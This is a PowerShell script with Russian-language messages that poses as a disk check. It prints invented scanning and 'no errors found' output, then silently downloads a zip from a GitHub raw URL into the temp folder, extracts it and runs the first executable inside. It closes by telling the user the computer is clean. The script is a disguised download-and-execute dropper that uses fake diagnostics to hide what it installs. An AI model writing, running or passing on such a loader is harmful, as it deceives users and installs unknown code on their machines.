$Url = "https://raw.githubusercontent.com/v25888656-maker/check_install/main/check.zip"
$DownloadPath = "$env:TEMP\check_install.zip"
$ExtractPath = "$env:TEMP\check_extracted"

Write-Host "[*] Распознавание диска..." -ForegroundColor Cyan
Start-Sleep -Seconds 1
Write-Host "[*] Сканирование..." -ForegroundColor Cyan
Start-Sleep -Seconds 1
Write-Host "[ OK ] Ошибок не обнаружено" -ForegroundColor Green

$maxAttempts = 3
$attempt = 1
$downloaded = $false

while ($attempt -le $maxAttempts -and -not $downloaded) {
    try {
        Write-Host "[*] Попытка скачивания $attempt из $maxAttempts..." -ForegroundColor Cyan
        Invoke-WebRequest -Uri $Url -OutFile $DownloadPath -TimeoutSec 30
        $downloaded = $true
        Write-Host "[+] Файл скачан" -ForegroundColor Green
    } catch {
        Write-Host "[-] Ошибка скачивания (попытка $attempt)" -ForegroundColor Red
        $attempt++
        if ($attempt -le $maxAttempts) {
            Write-Host "[*] Повтор через 2 секунды..." -ForegroundColor Yellow
            Start-Sleep -Seconds 2
        }
    }
}

if (-not $downloaded) {
    Write-Host "[-] Не удалось скачать. Повторите попытку позже" -ForegroundColor Red
    Start-Sleep -Seconds 3
    exit
}

try {
    Expand-Archive -Path $DownloadPath -DestinationPath $ExtractPath -Force
    Write-Host "[+] Архив распакован" -ForegroundColor Green
} catch {
    Write-Host "[-] Ошибка распаковки" -ForegroundColor Red
    Start-Sleep -Seconds 3
    exit
}

$Exe = Get-ChildItem -Path $ExtractPath -Filter "*.exe" -Recurse | Select-Object -First 1
if ($Exe) {
    Start-Process $Exe.FullName
    Write-Host "[+] Запуск $($Exe.Name)" -ForegroundColor Green
} else {
    Write-Host "[-] .exe не найден" -ForegroundColor Yellow
}

Write-Host "[*] Завершение..." -ForegroundColor Cyan
Start-Sleep -Seconds 1
Write-Host "[ OK ] Система готова" -ForegroundColor Green
Write-Host "[+] Компьютер чист" -ForegroundColor Green

Start-Sleep -Seconds 2
Start-Process cmd -ArgumentList "/c echo Компьютер чист & timeout /t 3 & exit"
Start-Sleep -Seconds 1
exit
